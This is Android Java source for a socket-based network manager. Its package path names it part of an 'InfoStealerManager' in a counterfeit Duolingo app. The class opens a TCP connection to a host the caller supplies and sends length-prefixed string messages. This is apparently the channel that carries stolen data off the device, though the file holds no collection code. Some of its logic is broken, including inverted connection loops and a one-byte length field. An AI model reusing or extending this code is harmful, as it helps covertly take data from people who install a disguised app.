package com.example.duolingopezzotto.InfoStealerManager;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.io.*;
import java.net.*;

public class NetworkManager {
    private Socket socket;
    private DataOutputStream out;
    private BufferedOutputStream bufferedOutputStream;

    public void openConnection(String address, int port,Context context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            //TODO: GESTIRE IL CASO IN CUI NON SI DIANO I PERMESSI PER CONNETTERSI AD INTERNET
            System.out.println("Mnacano i permessi per Internet");
        } else {
            System.out.println("I permessi ci sono");
            try {
                socket = new Socket(address, port);

                while (!socket.isConnected()) {
                    if(socket.isConnected()) {
                        out = new DataOutputStream(socket.getOutputStream());
                        bufferedOutputStream = new BufferedOutputStream(out);
                        if(socket.isConnected() && (out == null || bufferedOutputStream == null))
                            Log.e("Network Manager","out e/o bufferedOutputStream sono null:\nout: "+out+"\nbufferedOutputStream: "+bufferedOutputStream);
                    }
                }
                Log.i("Network Manager", "Connected to " + address + ":" + port);
                Log.i("Network Manager","out: "+out+"\nbufferedOutputStream: "+bufferedOutputStream);
            } catch (IOException he) {
                Log.e("Network Manager", he.toString());
            }
        }
    }

    public void writeAndcheckMessage(String s) throws  IOException{
        out.writeUTF(s);
        if(out.size() != s.length()) { throw new IOException(); }
    }

    public void sendMessage2(StringBuilder message) {
        String messaggio = message.toString();
        try {
            while(!socket.isConnected()){
                out = new DataOutputStream(socket.getOutputStream());
                bufferedOutputStream = new BufferedOutputStream(out);
            }
            if(out == null || bufferedOutputStream == null) { throw new Exception(); }
            Log.i("NetMan.MessageLenght","Messaggio: "+messaggio.length());
            // Converte la stringa del messaggio in un array di byte
            byte[] messageBytes = messaggio.getBytes();
            // Invia i dati al server
           // bufferedOutputStream.flush();
            bufferedOutputStream.write((byte)messaggio.length());
           // bufferedOutputStream.flush();
            bufferedOutputStream.write(messageBytes);

            System.out.println("Messaggio inviato con successo.");

        } catch (IOException e) {
            System.err.println("Si è verificato un errore durante l'invio del messaggio:");
            e.printStackTrace();
        } catch (Exception e) {
            System.err.println("Si è verificato un errore imprevisto:");
            e.printStackTrace();
        }
    }
    public void closeConnection(){
        try {
            bufferedOutputStream.close();
            out.close();
            socket.close();
        } catch (IOException io) { Log.e("Network Manager", "Error closing connection: " + io); }
    }
}
